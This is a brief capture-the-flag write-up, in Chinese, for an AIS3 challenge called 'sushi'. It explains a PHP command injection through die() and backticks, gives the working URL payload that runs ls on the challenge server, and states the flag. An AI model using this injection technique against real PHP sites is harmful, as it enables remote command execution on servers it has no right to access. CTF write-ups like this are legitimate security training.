### sushi
#### solution
這題在`die`當中可以進行injection，而只要搭配php的backtick執行指令，結果就會被`die`輸出。
http://104.199.235.135:31333/?%F0%9F%8D%A3=".\`ls\`."
可以得知 flag 藏在：
http://104.199.235.135:31333/flag_name_1s_t00_l0ng_QAQQQQQQ
#### flag
```
AIS3{php_is_very_very_very_easyyyyyy}
```
